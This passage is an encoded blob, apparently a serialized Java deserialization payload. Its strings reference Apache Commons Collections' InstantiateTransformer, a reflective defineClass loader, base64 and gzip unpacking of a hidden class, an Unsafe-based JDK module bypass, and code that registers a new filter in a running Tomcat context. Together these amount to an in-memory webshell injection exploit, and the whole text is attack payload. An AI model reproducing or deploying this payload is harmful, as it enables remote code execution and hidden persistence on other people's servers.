ndzYlRxRjV0YnF1WGRBc3grRHZmQTB0clVyd3k4dmJSckV6aFN1cUs1TTRjcmpyZUo0V29VWGEybS9VeWtxNUxPYW9tcm9qWjg3dGFqZ3g3azBZaFgzaXJpNkRuV2tycUJKNjdGQitWMlpOYXlTSHRVcXFaWFloSXRJMDhnNXFZWXhGWFlOQlJvMkM0MmZqL0l4ekszY05VNGF4REJtd1paZWxGUnJWWXA0MDA3U0g2V3hWclNVdnY0VWpFQ1ZqMzdaK0FpbDBIc2EwWFo3VlFyeFFTU25UVXZoVUFyWHRwQWxVQ2s5TFlDUG5tVThuY2Z6QjROWHdCVUhmWnBKcjN5MHRKcGUxZEFMNmZFQzBqcm84U2E4TG4yV0cxVXlGcERpS3M2RThzNk5nbUd5MGVJQWY1Yk5OSlpZUkVJYUxacFZwZ09IYVBTYlQrSHRnYXJTZDRvemVIY0t0MWR4Zkg4S2Q3WldwM0MwOUpQMkIzRzQzVmE2dVkxYjFYdzUwbTd6Y1g3bkdRVG94N3JXMGs4cDloUStXMmYzMkNYTDNia3NIbnNlVDJHZG5jN0w5TjZJelRTc0huMHdzMEZZd1lPenFta0xIVzFDT2Irbk42S1ZsSmR3dFpuUFMrblJOdklFeU5XQ2ZteFhnZG5LNEpVek1EZmdSaFdpdGJnSmI2Q1VBRk5mcnRuSldaMWVxMmVPdmpHZEtJZndKZ1pSQnJBZk4yY0RXQ0hUWTdNNjhrd0FoN0ZTcG9aNmwvR1VhNitTL1BNeVpUaHlCZmZnQzFhQUMrNW1lR21XbUZ0NUJrL1UyYXZPNE1tNlFvL2RkeCtlRzhJUEN2QUlYc3A1NCtURkZINTZCNTczMklmd1M0RzZJcC9IemdJZndtOEtrTUlmNmpTZlI3T2w4RktkNWlrcWZYa0lyeFRnVVN5Uzg5TW9hR2V5SFUzaDFVSDgwNk9sOE5vUWtadDVlYXZIN2hZRkhtMUkyR3c0amFmYkI0Vzl6cEhsUDRQRDh0U0tqMkZxbmZPMEtHcjNPQWRGOGNPZVlvOGpKYzdidzlHdXhzSWhNVjNnQktwc1RHQXhNeVhLUGNVcE1UZXo0WlBrODNueUw1MFNDK1ZtbGw2U1g4Q1ZZeWlwcnF3YUVrdWxVZWZWRldWZTdxV1Z0K0VvN3VMTUdrOUMzdVRUczhtd0gzUDQzTWxrM2NXMDJNUHF2NEo3N1R6c3ZiZ2MrMWdEVnpLcHIySVRkRFVsZEZDR1FTbEJxdW1rekM0TUlZUXZVY296T0lEbmlha3ZvMWZZRUJORjZCTlRrS1NtaEhEREZPVTRxSkxvWm1MR1VlcStqd2xUVENsTzNNL29PeWs3amtHY1lscmRpeDNwM2JWNG5QSWZvRzFiR2R6VFRDS05zaHprMk1BMW5ud0dnVGo3SWg2VUNNVFpRM2hZMWkxbloyaVpEVVdpREYvR1Y1aEJMakVOWDhYWG1EZU5DdjhkdzNUTm9XRG5VUTNmMFBDNGhpYzBQS25oS1dZaE1Fd0VLcDVvVzJPdnhnVDk3bXNvMFhCa21NRXF5aWRsbW1vTnpPSmlsY05GN0ZLOHdrYzcyZWRhV1l4WDBqRFI1eGExcXN6ZFlrVzZ1Z095dW1YWlcvVmRhZFgzWnY2T0J4U2t0RmE3eFNyYmd6TEpiaGNjajVBZ0RSRnVzU1pYU2dZamNtVW93SzdLQWNjNU1xaTRscVYzSFZldko5emRRUGkva1lod2t6cTZUZHpYc0ZSVXFncGZoWTFxWnVPK1YxU3ArcTlCbzZqbTRValk3TXRlRDMyaUpsdjF2Tjk2Wldubmx2UXVjV0U2R0tzVlN2RHNSdTVZNjBLOEplZENGRm5CUXF3VjYwYndRZkMrRUhYWmRxRlMwWTRqN0hCT1k1QVI1aERyczR4TlNnMFJ5aTAybkVTNVcydzZpVVZuNndoRXR2dHdFU1M5bUF2OEYvYittMlp6R1FBQQgAFwEABjxpbml0PgEAFShMamF2YS9sYW5nL1N0cmluZzspVgwAGQAaCgAWABsBAAMoKVYBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwAeAQAGZmlsdGVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAHY29udGV4dAEACGNvbnRleHRzAQAQTGphdmEvdXRpbC9MaXN0OwEAFkxvY2FsVmFyaWFibGVUeXBlVGFibGUBACRMamF2YS91dGlsL0xpc3Q8TGphdmEvbGFuZy9PYmplY3Q7PjsBAA5qYXZhL3V0aWwvTGlzdAcAJwEAEmphdmEvdXRpbC9JdGVyYXRvcgcAKQEADVN0YWNrTWFwVGFibGUMABkAHQoABAAsAQAPYnlwYXNzSkRLTW9kdWxlDAAuAB0KAAIALwEACmdldENvbnRleHQBABIoKUxqYXZhL3V0aWwvTGlzdDsMADEAMgoAAgAzAQAIaXRlcmF0b3IBABYoKUxqYXZhL3V0aWwvSXRlcmF0b3I7DAA1ADYLACgANwEAB2hhc05leHQBAAMoKVoMADkAOgsAKgA7AQAEbmV4dAEAFCgpTGphdmEvbGFuZy9PYmplY3Q7DAA9AD4LACoAPwEACWdldEZpbHRlcgEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DABBAEIKAAIAQwEACWFkZEZpbHRlcgEAJyhMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspVgwARQBGCgACAEcBAARrZXkxAQAIY2hpbGRyZW4BABNMamF2YS91dGlsL0hhc2hNYXA7AQADa2V5AQALY2hpbGRyZW5NYXABAAZ0aHJlYWQBABJMamF2YS9sYW5nL1RocmVhZDsBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAHdGhyZWFkcwEAE1tMamF2YS9sYW5nL1RocmVhZDsHAFMBABBqYXZhL2xhbmcvVGhyZWFkBwBVAQARamF2YS91dGlsL0hhc2hNYXAHAFcBABNqYXZhL3V0aWwvQXJyYXlMaXN0BwBZCgBaACwBAApnZXRUaHJlYWRzCABcAQAMaW52b2tlTWV0aG9kAQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsMAF4AXwoAAgBgAQAHZ2V0TmFtZQwAYgAGCgBWAGMBABxDb250YWluZXJCYWNrZ3JvdW5kUHJvY2Vzc29yCABlAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoMAGcAaAoAFgBpAQAGdGFyZ2V0CABrAQAFZ2V0RlYMAG0AXwoAAgBuAQAGdGhpcyQwCABwCABKAQAGa2V5U2V0AQARKClMamF2YS91dGlsL1NldDsMAHMAdAoAWAB1AQANamF2YS91dGlsL1NldAcAdwsAeAA3AQADZ2V0DAB6AEIKAFgAewEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwwAfQB+CgAEAH8BAA9qYXZhL2xhbmcvQ2xhc3MHAIEKAIIAYwEAD1N0YW5kYXJkQ29udGV4dAgAhAEAA2FkZAEAFShMamF2YS9sYW5nL09iamVjdDspWgwAhgCHCwAoAIgBABVUb21jYXRFbWJlZGRlZENvbnRleHQIAIoBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7DACMAI0KAFYAjgEACHRvU3RyaW5nDACQAAYKAIIAkQEAGVBhcmFsbGVsV2ViYXBwQ2xhc3NMb2FkZXIIAJMBAB9Ub21jYXRFbWJlZGRlZFdlYmFwcENsYXNzTG9hZGVyCACVAQAJcmVzb3VyY2VzCACXCAAiAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24HAJoBABgoTGphdmEvbGFuZy9UaHJvd2FibGU7KVYMABkAnAoAmwCdAQAgamF2YS9sYW5nL0lsbGVnYWxBY2Nlc3NFeGNlcHRpb24HAJ8BAB9qYXZhL2xhbmcvTm9TdWNoTWV0aG9kRXhjZXB0aW9uBwChAQAramF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvblRhcmdldEV4Y2VwdGlvbgcAowEACVNpZ25hdHVyZQEAJigpTGphdmEvdXRpbC9MaXN0PExqYXZhL2xhbmcvT2JqZWN0Oz47AQATamF2YS9sYW5nL1Rocm93YWJsZQcApwEACWNsYXp6Qnl0ZQEAAltCAQALZGVmaW5lQ2xhc3MBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEABWNsYXp6AQARTGphdmEvbGFuZy9DbGFzczsBAAtjbGFzc0xvYWRlcgEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7DACvALAJAAIAsQEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwwAswC0CgBWALUBAA5nZXRDbGFzc0xvYWRlcgwAtwCNCgCCALgMAA4ABgoAAgC6AQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyBwC8AQAJbG9hZENsYXNzAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwwAvgC/CgC9AMAMABEABgoAAgDCAQAMZGVjb2RlQmFzZTY0AQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgwAxADFCgACAMYBAA5nemlwRGVjb21wcmVzcwEABihbQilbQgwAyADJCgACAMoIAKsHAKoBABFqYXZhL2xhbmcvSW50ZWdlcgcAzgEABFRZUEUMANAArgkAzwDRAQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7DADTANQKAIIA1QEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAcA1wEADXNldEFjY2Vzc2libGUBAAQoWilWDADZANoKANgA2wEAB3ZhbHVlT2YBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7DADdAN4KAM8A3wEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwA4QDiCgDYAOMBAAtuZXdJbnN0YW5jZQwA5QA+CgCCAOYBAA1nZXRGaWx0ZXJOYW1lAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAxsYXN0RG90SW5kZXgBAAFJAQAJY2xhc3NOYW1lAQASTGphdmEvbGFuZy9TdHJpbmc7AQABLggA7gEAC2xhc3RJbmRleE9mAQAVKExqYXZhL2xhbmcvU3RyaW5nOylJDADwAPEKABYA8gEACXN1YnN0cmluZwEAFShJKUxqYXZhL2xhbmcvU3RyaW5nOwwA9AD1CgAWAPYBAAlmaWx0ZXJEZWYBAAlmaWx0ZXJNYXABAAJlMgEADGNvbnN0cnVjdG9ycwEAIFtMamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I7AQAMZmlsdGVyQ29uZmlnAQANZmlsdGVyQ29uZmlncwEAD0xqYXZhL3V0aWwvTWFwOwEADmNhdGFsaW5hTG9hZGVyAQAPZmlsdGVyQ2xhc3NOYW1lAQAKZmlsdGVyTmFtZQEAI1tMamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I8Kj47BwD8AQARZ2V0Q2F0YWxpbmFMb2FkZXIMAQUAjQoAAgEGDADoAOkKAAIBCAEADWZpbmRGaWx0ZXJEZWYIAQoBAF0oTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMAF4BDAoAAgENAQAvb3JnLmFwYWNoZS50b21jYXQudXRpbC5kZXNjcmlwdG9yLndlYi5GaWx0ZXJEZWYIAQ8BAAdmb3JOYW1lAQA9KExqYXZhL2xhbmcvU3RyaW5nO1pMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylMamF2YS9sYW5nL0NsYXNzOwwBEQESCgCCARMBAC9vcmcuYXBhY2hlLnRvbWNhdC51dGlsLmRlc2NyaXB0b3Iud2ViLkZpbHRlck1hcAgBFQEAJG9yZy5hcGFjaGUuY2F0YWxpbmEuZGVwbG95LkZpbHRlckRlZggBFwEAJG9yZy5hcGFjaGUuY2F0YWxpbmEuZGVwbG95LkZpbHRlck1hcAgBGQEADXNldEZpbHRlck5hbWUIARsBAA5zZXRGaWx0ZXJDbGFzcwgBHQEADGFkZEZpbHRlckRlZggBHwEADXNldERpc3BhdGNoZXIIASEBAAdSRVFVRVNUCAEjAQANYWRkVVJMUGF0dGVybggBJQwABQAGCgACAScBADBvcmcuYXBhY2hlLmNhdGFsaW5hLmNvcmUuQXBwbGljYXRpb25GaWx0ZXJDb25maWcIASkBABdnZXREZWNsYXJlZENvbnN0cnVjdG9ycwEAIigpW0xqYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcjsMASsBLAoAggEtAQANc2V0VVJMUGF0dGVybggBLwEAEmFkZEZpbHRlck1hcEJlZm9yZQgBMQEADGFkZEZpbHRlck1hcAgBMwEAHWphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yBwE1CgE2ANsBACcoW0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMAOUBOAoBNgE5CAD+AQANamF2YS91dGlsL01hcAcBPAEAA3B1dAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DAE+AT8LAT0BQAEAD3ByaW50U3RhY2tUcmFjZQwBQgAdCgAfAUMBACBqYXZhL2xhbmcvQ2xhc3NOb3RGb3VuZEV4Y2VwdGlvbgcBRQEAIGphdmEvbGFuZy9JbnN0YW50aWF0aW9uRXhjZXB0aW9uBwFHAQABaQEADGRlY29kZXJDbGFzcwEAB2RlY29kZXIBAAdpZ25vcmVkAQAJYmFzZTY0U3RyAQAUTGphdmEvbGFuZy9DbGFzczwqPjsBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyCAFPDAERAL8KAIIBUQEADGRlY29kZUJ1ZmZlcggBUwEACWdldE1ldGhvZAwBVQDUCgCCAVYBABBqYXZhLnV0aWwuQmFzZTY0CAFYAQAKZ2V0RGVjb2RlcggBWgEABmRlY29kZQgBXAEADmNvbXByZXNzZWREYXRhAQADb3V0AQAfTGphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtOwEAAmluAQAeTGphdmEvaW8vQnl0ZUFycmF5SW5wdXRTdHJlYW07AQAGdW5nemlwAQAfTGphdmEvdXRpbC96aXAvR1pJUElucHV0U3RyZWFtOwEABmJ1ZmZlcgEAAW4BAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQcBZwEAHGphdmEvaW8vQnl0ZUFycmF5SW5wdXRTdHJlYW0HAWkBAB1qYXZhL3V0aWwvemlwL0daSVBJbnB1dFN0cmVhbQcBawoBaAAsAQAFKFtCKVYMABkBbgoBagFvAQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWDAAZAXEKAWwBcgEABHJlYWQBAAUoW0IpSQwBdAF1CgFsAXYBAAV3cml0ZQEAByhbQklJKVYMAXgBeQoBaAF6AQALdG9CeXRlQXJyYXkBAAQoKVtCDAF8AX0KAWgBfgEAA29iagEACWZpZWxkTmFtZQEABWZpZWxkAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEABGdldEYBAD8oTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsMAYQBhQoAAgGGAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQHAYgKAYkA2woBiQB7AQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uBwGMAQAgTGphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbjsBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7DAGPAZAKAIIBkQEADWdldFN1cGVyY2xhc3MMAZMAfgoAggGUCgGNABsBAAx0YXJnZXRPYmplY3QBAAptZXRob2ROYW1lAQAHbWV0aG9kcwEAG1tMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAIUxqYXZhL2xhbmcvTm9TdWNoTWV0aG9kRXhjZXB0aW9uOwEAIkxqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbjsBAApwYXJhbUNsYXp6AQASW0xqYXZhL2xhbmcvQ2xhc3M7AQAFcGFyYW0BABNbTGphdmEvbGFuZy9PYmplY3Q7AQAGbWV0aG9kAQAJdGVtcENsYXNzBwGaAQASZ2V0RGVjbGFyZWRNZXRob2RzAQAdKClbTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsMAaQBpQoAggGmCgDYAGMBAAZlcXVhbHMMAakAhwoAFgGqAQARZ2V0UGFyYW1ldGVyVHlwZXMBABQoKVtMamF2YS9sYW5nL0NsYXNzOwwBrAGtCgDYAa4KAKIAGwEACmdldE1lc3NhZ2UMAbEABgoAoAGyCgCbABsBAAg8Y2xpbml0PgoAAgAsAQAPc3VuLm1pc2MuVW5zYWZlCAG3AQAJdGhlVW5zYWZlCAG5AQAJZ2V0TW9kdWxlCAG7BwGgAQARb2JqZWN0RmllbGRPZmZzZXQIAb4BAAZtb2R1bGUIAcABAA9nZXRBbmRTZXRPYmplY3QIAcIBAA5qYXZhL2xhbmcvTG9uZwcBxAkBxQDRACEAAgAEAAAAAQACAK8AsAAAABEAAQAFAAYAAQAHAAAALQABAAEAAAADEg2wAAAAAgAIAAAABgABAAAAHQAJAAAADAABAAAAAwAKAAsAAAABAA4ABgABAAcAAAAQAAEAAQAAAAQTABCwAAAAAAABABEABgACABIAAAAEAAEAFAAHAAAAFwADAAEAAAALuwAWWRMAGLcAHLAAAAAAAAEAGQAdAAEABwAAANwABAAFAAAAOiq3AC0qtgAwKrYANEwruQA4AQBNLLkAPAEAmQAbLLkAQAEATiottwBEOgQqLRkEtgBIp//ipwAETLEAAQAIADUAOAAfAAQACAAAACYACQAAAC0ACAAvAA0AMAAkADEAKwAyADIAMwA1ADYAOAA0ADkAOQAJAAAAKgAEACsABwAgACEABAAkAA4AIgAhAAMADQAoACMAJAABAAAAOgAKAAsAAAAlAAAADAABAA0AKAAjACYAAQArAAAAGgAE/wAUAAMHAAIHACgHACoAAPkAIEIHAB8AAAEAMQAyAAMABwAAAtgAAwAOAAABebsAWlm3AFtMElYSXbgAYcAAVMAAVE0BTiw6BBkEvjYFAzYGFQYVBaIBQRkEFQYyOgcZB7YAZBJmtgBqmQCzLccArxkHEmy4AG8ScbgAbxJyuABvwABYOggZCLYAdrkAeQEAOgkZCbkAPAEAmQCAGQm5AEABADoKGQgZCrYAfBJyuABvwABYOgsZC7YAdrkAeQEAOgwZDLkAPAEAmQBNGQy5AEABADoNGQsZDbYAfE4txgAaLbYAgLYAgxKFtgBqmQALKy25AIkCAFctxgAaLbYAgLYAgxKLtgBqmQALKy25AIkCAFen/6+n/3ynAHcZB7YAj8YAbxkHtgCPtgCAtgCSEpS2AGqaABYZB7YAj7YAgLYAkhKWtgBqmQBJGQe2AI8SmLgAbxKZuABvTi3GABottgCAtgCDEoW2AGqZAAsrLbkAiQIAVy3GABottgCAtgCDEou2AGqZAAsrLbkAiQIAV4QGAaf+vqcADzoEuwCbWRkEtwCevyuwAAEAGAFoAWsAHwAEAAgAAAByABwAAAA8AAgAPQAWAD4AGABAADEAQgBCAEMAWABGAHcARwCIAEoApwBLAK8ATADCAE0AygBPAN0AUADlAFEA6ABSAOsAUwDuAFUBHABWASwAVwE/AFgBRwBZAVoAWgFiAEABaABfAWsAXQFtAF4BdwBgAAkAAABmAAoApwA+AEkAIQANAIgAYABKAEsACwB3AHEATAAhAAoAWACTAE0ASwAIADEBMQBOAE8ABwFtAAoAUABRAAQAAAF5AAoACwAAAAgBcQAjACQAAQAWAWMAUgBTAAIAGAFhACIAIQADACUAAAAMAAEACAFxACMAJgABACsAAABPAA7/ACMABwcAAgcAKAcAVAcABAcAVAEBAAD+AEAHAFYHAFgHACr+AC8HAAQHAFgHACr8ADUHAAT6ABr4AAL5AAICLSr6ABr4AAVCBwAfCwASAAAACAADAKAAogCkAKUAAAACAKYAAgBBAEIAAQAHAAABdwAGAAcAAACZAU0qtACyxwANKrgAtrYAj7UAsiq0ALLHAA4qK7YAgLYAubUAsiq0ALIqtgC7tgDBTacAZk4qtgDDuADHuADLOgQSvRLMBr0AglkDEs1TWQSyANJTWQWyANJTtgDWOgUZBQS2ANwZBSq0ALIGvQAEWQMZBFNZBAO4AOBTWQUZBL64AOBTtgDkwACCOgYZBrYA502nAAU6BCywAAIAJQAxADQAHwA1AJIAlQCoAAMACAAAAEIAEAAAAGYAAgBnAAkAaAATAGoAGgBrACUAbgAxAHgANABvADUAcQBBAHIAXwBzAGUAdACMAHUAkgB3AJUAdgCXAHkACQAAAEgABwBBAFEAqQCqAAQAXwAzAKsArAAFAIwABgCtAK4ABgA1AGIAUABRAAMAAACZAAoACwAAAAAAmQAiACEAAQACAJcAIAAhAAIAKwAAACYABfwAEwcABBFOBwAf/wBgAAQHAAIHAAQHAAQHAB8AAQcAqPoAAQABAOgA6QABAAcAAABtAAMAAwAAABorEu+2AGqZABIrEu+2APM9KxwEYLYA97ArsAAAAAMACAAAABIABAAAAH0ACQB+ABAAfwAYAIEACQAAACAAAwAQAAgA6gDrAAIAAAAaAAoACwAAAAAAGgDsAO0AAQArAAAAAwABGAABAEUARgACAAcAAARqAAcACwAAAf8qtgEHTiq2ALs6BCoZBLYBCToFKxMBCwS9AIJZAxIWUwS9AARZAxkFU7gBDsYABLGnAAU6CBMBEAQqtACyuAEUtgDnOgYTARYEKrQAsrgBFLYA5zoHpwBEOggTARgEKrQAsrgBFLYA5zoGEwEaBCq0ALK4ARS2AOc6B6cAHzoJEwEYBC24ARS2AOc6BhMBGgQtuAEUtgDnOgcZBhMBHAS9AIJZAxIWUwS9AARZAxkFU7gBDlcZBhMBHgS9AIJZAxIWUwS9AARZAxkEU7gBDlcrEwEgBL0AglkDGQa2AIBTBL0ABFkDGQZTuAEOVxkHEwEcBL0AglkDEhZTBL0ABFkDGQVTuAEOVxkHEwEiBL0AglkDEhZTBL0ABFkDEwEkU7gBDlcZBxMBJgS9AIJZAxIWUwS9AARZAyq2AShTuAEOVxMBKgQqtACyuAEUtgEuOginAC86CRkHEwEwBL0AglkDEhZTBL0ABFkDKrYBKFO4AQ5XEwEqBC24ARS2AS46CCsTATIEvQCCWQMZB7YAgFMEvQAEWQMZB1O4AQ5XpwAiOgkrEwE0BL0AglkDGQe2AIBTBL0ABFkDGQdTuAEOVxkIAzIEtgE3GQgDMgW9AARZAytTWQQZBlO2ATo6CSsTATu4AG/AAT06ChkKGQUZCbkBQQMAV6cACjoIGQi2AUSxAAYAEwAvADMAHwA1AFUAWAAfAFoAegB9AB8BIwFQAVMAHwF/AZwBnwAfAJkB9AH3AB8ABAAIAAAAogAoAAAAhwAFAIgACwCJABMAjwAvAJAAMACTADMAkgA1AJcARQCYAFUAowBYAJkAWgCcAGoAnQB6AKIAfQCeAH8AoACMAKEAmQClALQApgDPAKcA7ACoAQcAqQEjAKwBQACtAVAAsgFTAK4BVQCwAXIAsQF/ALUBnAC4AZ8AtgGhALcBvgC6AcYAuwHcALwB6AC9AfQAwAH3AL4B+QC/Af4AwQAJAAAA1AAVAEUAEwD4ACEABgBVAAMA+QAhAAcAagATAPgAIQAGAHoAAwD5ACEABwB/ABoAUABRAAkAWgA/APoAUQAIAVAAAwD7APwACAFVACoAUABRAAkBoQAdAFAAUQAJAX8AdQD7APwACAHcABgA/QAhAAkB6AAMAP4A/wAKAfkABQBQAFEACAAAAf8ACgALAAAAAAH/ACIAIQABAAAB/wAgACEAAgAFAfoBAACwAAMACwH0AQEA7QAEABMB7AECAO0ABQCMAXMA+AAhAAYAmQFmAPkAIQAHACUAAAAWAAIBUAADAPsBAwAIAX8AdQD7AQMACAArAAAAiwAM/gAwBwC9BwAWBwAWQgcAHwFiBwAf/wAkAAkHAAIHAAQHAAQHAL0HABYHABYAAAcAHwABBwAf/wAbAAgHAAIHAAQHAAQHAL0HABYHABYHAAQHAAQAAPcAuQcAH/wAKwcBBF8HAB8e/wA4AAgHAAIHAAQHAAQHAL0HABYHABYHAAQHAAQAAQcAHwYAEgAAAAwABQCkAKIAoAFGAUgAAQEFAI0AAgAHAAAAsgACAAQAAAA4ElYSXbgAYcAAVMAAVEwBTQM+HSu+ogAhKx0ytgBkEma2AGqZAA0rHTK2AI9NpwAJhAMBp//fLLAAAAADAAgAAAAiAAgAAADEAA4AxQAQAMYAGADIACYAyQAtAMoAMADGADYAzQAJAAAAKgAEABIAJAFJAOsAAwAAADgACgALAAAADgAqAFIAUwABABAAKAEAALAAAgArAAAAEAAD/gASBwBUBwC9AR36AAUAEgAAAAgAAwCiAKQAoAAIAMQAxQACAAcAAAEFAAYABAAAAG8TAVC4AVJMKxMBVAS9AIJZAxIWU7YBVyu2AOcEvQAEWQMqU7YA5MAAzcAAzbBNEwFZuAFSTCsTAVsDvQCCtgFXAQO9AAS2AOROLbYAgBMBXQS9AIJZAxIWU7YBVy0EvQAEWQMqU7YA5MAAzcAAzbAAAQAAACwALQAfAAQACAAAABoABgAAANMABwDUAC0A1QAuANYANQDXAEkA2AAJAAAANAAFAAcAJgFKAK4AAQBJACYBSwAhAAMALgBBAUwAUQACAAAAbwFNAO0AAAA1ADoBSgCuAAEAJQAAABYAAgAHACYBSgFOAAEANQA6AUoBTgABACsAAAAGAAFtBwAfABIAAAAKAAQBRgCiAKQAoAAJAMgAyQACAAcAAADUAAQABgAAAD67AWhZtwFtTLsBalkqtwFwTbsBbFkstwFzThEBALwIOgQtGQS2AXdZNgWbAA8rGQQDFQW2AXun/+srtgF/sAAAAAMACAAAAB4ABwAAAN0ACADeABEA3wAaAOAAIQDiAC0A4wA5AOUACQAAAD4ABgAAAD4BXgCqAAAACAA2AV8BYAABABEALQFhAWIAAgAaACQBYwFkAAMAIQAdAWUAqgAEACoAFAFmAOsABQArAAAAHAAC/wAhAAUHAM0HAWgHAWoHAWwHAM0AAPwAFwEAEgAAAAQAAQAUAAgAbQBfAAIABwAAAFcAAgADAAAAESoruAGHTSwEtgGKLCq2AYuwAAAAAgAIAAAADgADAAAA6QAGAOoACwDrAAkAAAAgAAMAAAARAYAAIQAAAAAAEQGBAO0AAQAGAAsBggGDAAIAEgAAAAQAAQAfAAgBhAGFAAIABwAAAMcAAwAEAAAAKCq2AIBNLMYAGSwrtgGSTi0EtgGKLbBOLLYBlU2n/+m7AY1ZK7cBlr8AAQAJABUAFgGNAAQACAAAACYACQAAAO8ABQDwAAkA8gAPAPMAFAD0ABYA9QAXAPYAHAD3AB8A+QAJAAAANAAFAA8ABwGCAYMAAwAXAAUAUAGOAAMAAAAoAYAAIQAAAAAAKAGBAO0AAQAFACMArQCuAAIAJQAAAAwAAQAFACMArQFOAAIAKwAAAA0AA/wABQcAglAHAY0IABIAAAAEAAEBjQAoAF4AXwACAAcAAABCAAQAAgAAAA4qKwO9AIIDvQAEuAEOsAAAAAIACAAAAAYAAQAAAP0ACQAAABYAAgAAAA4BlwAhAAAAAAAOAZgA7QABABIAAAAIAAMAogCgAKQAKQBeAQwAAgAHAAACFwADAAkAAADKKsEAgpkACirAAIKnAAcqtgCAOgQBOgUZBDoGGQXHAGQZBsYAXyzHAEMZBrYBpzoHAzYIFQgZB76iAC4ZBxUIMrYBqCu2AauZABkZBxUIMrYBr76aAA0ZBxUIMjoFpwAJhAgBp//QpwAMGQYrLLYA1joFp/+pOgcZBrYBlToGp/+dGQXHAAy7AKJZK7cBsL8ZBQS2ANwqwQCCmQAaGQUBLbYA5LA6B7sAm1kZB7YBs7cBtL8ZBSottgDksDoHuwCbWRkHtgGztwG0vwADACUAcgB1AKIAnACjAKQAoACzALoAuwCgAAMACAAAAG4AGwAAAQEAFAECABcBBAAbAQUAJQEHACkBCQAwAQoAOwELAFYBDABdAQ0AYAEKAGYBEABpAREAcgEVAHUBEwB3ARQAfgEVAIEBFwCGARgAjwEaAJUBGwCcAR0ApAEeAKYBHwCzASMAuwEkAL0BJQAJAAAAegAMADMAMwFJAOsACAAwADYBmQGaAAcAdwAHAFABmwAHAKYADQBQAZwABwC9AA0AUAGcAAcAAADKAYAAIQAAAAAAygGYAO0AAQAAAMoBnQGeAAIAAADKAZ8BoAADABQAtgCtAK4ABAAXALMBoQCsAAUAGwCvAaIArgAGACsAAAAvAA4OQwcAgv4ACAcAggcA2AcAgv0AFwcBowEs+QAFAghCBwCiCw1UBwCgDkcHAKAAEgAAAAgAAwCiAKQAoAAIAbUAHQABAAcAAAAlAAIAAAAAAAm7AAJZtwG2V7EAAAABAAgAAAAKAAIAAAAqAAgAKwABAC4AHQABAAcAAAC/AAYACwAAAKsTAbi4AVJMKxMBurYBkk0sBLYBiiwBtgGLThKCEwG8A70AgrYBVzoEGQQSBAHAAb22AOQ6BS22AIATAb8EvQCCWQMTAYlTtgFXOgYSghMBwbYBkjoHGQYtBL0ABFkDGQdTtgDkOggttgCAEwHDBr0AglkDEgRTWQSyAcZTWQUSBFO2AVc6CRkJLQa9AARZAyq2AIBTWQQZCFNZBRkFU7YA5FenAAg6CqcAA7EAAQAAAKIApQAfAAAAAHQAC2RlZmluZUNsYXNzdXEAfgAbAAAAAXZxAH4ALHNyAD5vcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW5zdGFudGlhdGVUcmFuc2Zvcm1lcjSL9H+khtA7AgAC